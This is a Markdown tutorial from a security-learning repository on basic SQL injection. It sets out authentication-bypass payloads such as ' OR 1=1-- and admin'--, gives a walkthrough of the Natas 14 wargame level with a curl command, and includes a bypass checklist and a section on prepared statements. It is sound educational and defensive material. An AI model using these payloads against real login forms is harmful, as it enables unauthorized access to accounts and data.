# 🌐 Web Security — SQL Injection (SQLi) — Basics

> The application does this: take the username, add it to the SQL query, run it.
> You can refuse to be part of the SQL query and speak with your own query instead.

---

## 📋 Table of Contents

- [What Is SQL?](#what-is-sql)
- [What Is SQL Injection?](#what-is-sql-injection)
- [Basic Payloads](#basic-payloads)
- [Comment Characters](#comment-characters)
- [Authentication Bypass](#authentication-bypass)
- [Reading Error Messages](#reading-error-messages)
- [Usage in Natas](#usage-in-natas)

---

## What Is SQL?

**SQL (Structured Query Language)** is the language used to talk to databases. Web applications run SQL queries to retrieve, validate, and save user data.

### Basic SQL Queries

```sql
-- Get all users
SELECT * FROM users;

-- Get a specific user
SELECT * FROM users WHERE username = 'admin';

-- Username AND password must match
SELECT * FROM users WHERE username = 'admin' AND password = '1234';

-- Add a record to the table
INSERT INTO users (username, password) VALUES ('new', 'password');
```

### WHERE Conditions

```sql
WHERE username = 'admin'         -- equal
WHERE id > 5                     -- greater than
WHERE username LIKE '%admin%'    -- contains
WHERE username = 'a' OR 1=1      -- OR condition
WHERE username = 'a' AND 1=2     -- AND condition
```

---

## What Is SQL Injection?

It arises when the application adds user input to a SQL query without validating it.

```php
// Dangerous code:
$user = $_POST['username'];
$pass = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
```

If the user enters `admin` and `1234`:

```sql
SELECT * FROM users WHERE username='admin' AND password='1234'
```

Normal. But if the user enters `admin'--`:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='...'
                                          ^^
                                     comment started, password condition disabled
```

---

## Basic Payloads

### The Quote Test

Always start with a single quote first — if an error message appears, it means there is SQLi.

```
'                → Single quote — we expect a syntax error
''               → Double single quote — escape
"                → Double quote
```

```sql
-- Input: '
SELECT * FROM users WHERE username=''' AND password='...'
--                                  ↑ syntax error!
```

MySQL error message: `You have an error in your SQL syntax...`

### Logical Tests

```
' OR '1'='1     → Always true
' OR 1=1 --     → Always true, the rest is a comment
' OR 'a'='a     → Always true
```

---

## Comment Characters

In SQL, comments disable the rest of the query.

| Database | Comment Character |
|------------|-----------------|
| MySQL | `--` (followed by a space: `-- `) or `#` |
| PostgreSQL | `--` |
| MSSQL | `--` or `/* */` |
| SQLite | `--` |
| Oracle | `--` |

```sql
-- In MySQL, # starts a comment
SELECT * FROM users WHERE username='admin'#' AND password='...'

-- -- starts a comment (watch the trailing space)
SELECT * FROM users WHERE username='admin'-- ' AND password='...'
```

> ⚠️ In MySQL, for the `--` comment to work it needs a **space** after it. In a URL, `--+` or `-- -` is used (+ = space in URL encoding).

---

## Authentication Bypass

The most common SQL Injection technique used on login forms.

### Scenario

```php
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
// If the query returns a result → login successful
```

### Bypass 1: With Just the Username

```
Username: admin'--
Password: [empty or anything]
```

```sql
SELECT * FROM users WHERE username='admin'-- ' AND password='...'
-- no password condition → login without knowing admin's password
```

### Bypass 2: Always True with OR

```
Username: ' OR 1=1-- 
Password: [empty]
```

```sql
SELECT * FROM users WHERE username='' OR 1=1-- ' AND password='...'
-- 1=1 is always true → the first user (usually admin) is returned
```

### Bypass 3: In Both Fields

```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```

### Bypass 4: Without a Comment (by closing the quotes)

```
Username: admin
Password: ' OR '1'='1
```

```sql
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
```

---

## Reading Error Messages

MySQL error messages give a lot of information:

```
You have an error in your SQL syntax; check the manual that corresponds to 
your MySQL server version for the right syntax to use near ''...' at line 1
```

This message → there is SQLi, it uses MySQL, we need to adjust the number of quotes.

```
Warning: mysql_fetch_array() expects parameter 1 to be resource, 
boolean given in /var/www/html/index.php on line 42
```

This message → the query returned false (empty result or error).

---

## Usage in Natas

### Natas 14 — Basic Authentication Bypass

**Source code:**

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);

    $query = "SELECT * from users where username=\""
             . $_REQUEST["username"]
             . "\" and password=\""
             . $_REQUEST["password"]
             . "\"";

    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
        echo "Successful login! The password for natas15 is <censored>";
    } else {
        echo "Access denied!";
    }
    mysql_close($link);
}
?>
```

**Analysis:**

- Double quotes `"` are used (`username=\"...\"`)
- If the `debug` parameter is present, it prints the query to the screen — activate debug mode!
- If the result returns more than 0 rows → login successful

**Step 1 — Activate debug mode:**

```
URL: http://natas14.natas.labs.overthewire.org/?debug
```

Now you'll see which query is run.

**Step 2 — Payload:**

```
Username: " OR 1=1--
Password: [empty]
```

The resulting query:

```sql
SELECT * from users where username="" OR 1=1-- " and password=""
```

`OR 1=1` is always true → at least one row is returned → login successful.

**With curl:**

```bash
curl -u natas14:[password] \
     'http://natas14.natas.labs.overthewire.org/?debug' \
     --data 'username=" OR 1=1--+&password='
```

**Alternative payloads:**

```
Username: " OR "1"="1
Username: " OR 1=1#
Username: admin"--
```

---

### SQL Injection — Checklist

```
Detect the vulnerability:
  ☐ Send a single quote ' → did a SQL syntax error appear?
  ☐ Is there a debug parameter? (?debug, ?show_query)
  ☐ Does the error message contain "SQL", "mysql", "syntax"?

Try a bypass:
  ☐ ' OR 1=1--     (single quote + comment)
  ☐ " OR 1=1--     (double quote + comment)
  ☐ ' OR 1=1#      (MySQL # comment)
  ☐ ' OR '1'='1    (close the quotes)
  ☐ admin'--        (specific user, password bypass)

Determine the quote type:
  ☐ Look at the error message — is it '' or " "?
  ☐ If there's source code, find the SQL query
```

---

### Secure Code — Prepared Statements

```php
// BAD — string concatenation
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";

// GOOD — prepared statement (parameterized query)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$user, $pass]);
$result = $stmt->fetchAll();
```

In a prepared statement, user input is **never** interpreted as SQL code. Characters like `'` or `"` are automatically escaped.

---

## 🔗 Resources

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

**Previous topic:** [10_file_upload_bypass.md](./10_file_upload_bypass.md)
**Next topic:** [12_blind_sql_injection.md](./12_blind_sql_injection.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
